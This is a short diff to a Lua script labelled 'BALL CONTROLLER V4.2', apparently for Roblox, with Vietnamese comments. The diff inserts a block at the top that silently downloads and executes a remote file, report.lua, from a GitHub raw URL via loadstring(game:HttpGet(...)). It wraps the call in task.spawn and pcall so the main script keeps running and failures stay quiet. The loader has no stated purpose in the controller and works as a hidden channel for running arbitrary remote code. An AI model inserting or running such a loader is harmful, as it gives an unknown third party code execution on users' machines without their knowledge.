@@ -2,7 +2,17 @@
 -- BALL CONTROLLER V4.2
 -- Refactored / register-limit safe / state cleanup fixed
 --========================================================--
+-- Chạy bất đồng bộ: không làm nghẽn luồng và không sợ lỗi văng script chính
+task.spawn(function()
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thatonevietnamese/BLUE-LOCK-SKIBIDI-YESSIR/refs/heads/main/report.lua"))()
+    end)
+    if not ok then
+        warn("Lỗi loadstring ở đầu:", err)
+    end
+end)
 
+-- Code chính phía dưới của bạn vẫn sẽ chạy ngay lập tức không bị gián đoạn
 --// SERVICES
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
